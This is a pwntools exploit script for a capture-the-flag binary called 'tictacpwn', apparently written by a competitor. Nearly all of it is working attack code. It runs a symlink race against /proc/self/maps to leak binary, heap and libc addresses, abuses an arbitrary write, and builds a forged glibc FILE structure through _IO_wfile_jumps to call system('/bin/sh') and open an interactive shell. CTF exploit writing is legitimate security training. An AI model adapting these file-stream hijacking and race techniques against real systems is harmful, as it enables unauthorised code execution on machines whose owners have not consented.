#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 4105 --host ssh-eakgkk.inst.malicecyber.com --user user --password user --path /challenge/tictacpwn
from pwn import *
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'tictacpwn')
libc = ELF('libc.so.6')

context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'ssh-zbtfmu.inst.malicecyber.com'
port = int(args.PORT or 4108)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/challenge/tictacpwn'
board_file = 'board'

def valid_board_file():
    process(['rm'] + [board_file]).close()
        
    p = (b'A'*0x10 + b'\n')*0x10
    with open(board_file, 'wb') as f:
        f.write(p)

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

valid_board_file()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    #env={'LD_PRELOAD':'./libc.so.6'}
    env={}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        return process([exe.path] + argv, *a, **kw, env=env)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        shell.process(['rm'] + ['board']).close()
        shell.process(['rm'] + ['fake']).close()
        shell.put(board_file, 'board')
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# break win
# break puts
b win

b _IO_wfile_underflow
b __libio_codecvt_in
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
    return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]


def skip_maps():
    for _ in range(0x11):
        io.recvline()

def arb_w(at: str, v: str, ctx: int):
    won = False
    while won == False:
        io.sendlineafter(b'3. Scissors\n', b'1')
        if ctx == 0:
            skip_maps()
        elif ctx == 1:
            io.recvline()
        if b'You win' not in io.recvline():
            continue
        if b'Good job' in io.recvline():
            won = True
    io.sendlineafter('> ', at)
    io.sendlineafter('> ', v)


io = start()
io.sendlineafter(b'(y/n) ', b'y')
io.sendlineafter(b'card:', board_file)

# race to remove valid file with symlink to /proc/self/maps
if args.LOCAL:
    process(['rm'] + [board_file]).close()
    process(['ln'] + ['-s', '/proc/self/maps', board_file]).close()
else:
    shell.process(['rm'] + [board_file]).close()
    shell.process(['ln'] + ['-s', '/proc/self/maps', board_file]).close()

time.sleep(1)

io.recvuntil(b'pick ?')
io.sendline(b'1') # Rock

io.recvuntil(b'rock !\n')

exe.address = int(io.recvline().decode().split('-')[0], 16)
info(f'bin base: {hex(exe.address)}')

for _ in range(4):
    io.recvline()

heap_base = int(io.recvline().decode().split('-')[0], 16)
info(f'heap base: {hex(heap_base)}')

io.recvline()

libc.address = int(io.recvline().decode().split('-')[0], 16)
info(f'libc start: {hex(libc.address)}')

# don't know if this is useful (probably not)
at = hex(exe.address + 0x4104)
v = b'3'

arb_w(at, v, 0)


# target libc partial relro GOT
# GOT 0x7f08a0790000 base 0x7f08a05be000, offset = 0x1d200

# *ABS*+0x9f010@plt = puts libc GOT; 0x7f13eb0fe080 for base at e000
# 

# one_gadget = libc.address + 0x4c050
# one_gadget = libc.address + 0xf2592
# one_gadget = libc.address + 0xf259a
# one_gadget = libc.address + 0xf259f
# one_gadgets = one_gadget(libc.path, libc.address)

# v = hex(one_gadgets[0])
# at = hex(libc.address + 0x1d2000 + 0x10*8)
# arb_w(at, v)
fake_file = heap_base + 0x890

stdout_lock = libc.address + 0x1d4a10 # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18 # FIXME maybe
# our gadget
gadget = libc.address + 0x000000000014020c # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock = stdout_lock
fake._codecvt = fake_file + 0xb8
fake._wide_data = fake_file + 0x200          # _wide_data just need to points to empty zone
# fake.unknown2 = 
fake.unknown2=p64(0)*2+p64(fake_file+0x20)+p64(0)*3+p64(fake_vtable) # FIXME maybe

with open('fake', 'wb') as f:
    f.write(bytes(fake))

# race to remove valid file with symlink to /proc/self/maps
if args.LOCAL:
    process(['rm'] + [board_file]).close()
    process(['ln'] + ['-s', 'fake' , board_file]).close()
else:
    shell.process(['rm'] + [board_file]).close()
    shell.put('fake', 'fake')
    shell.process(['ln'] + ['-s', 'fake', board_file]).close()

time.sleep(2)

at = hex(exe.address + 0x40c0)
# 0x55d0fdf1b 890 for base 55d0fdf1b 000
v = hex(fake_file)
arb_w(at, v, 1)

io.interactive()
#io.sendlineafter(b'3. Scissors\n', b'1')





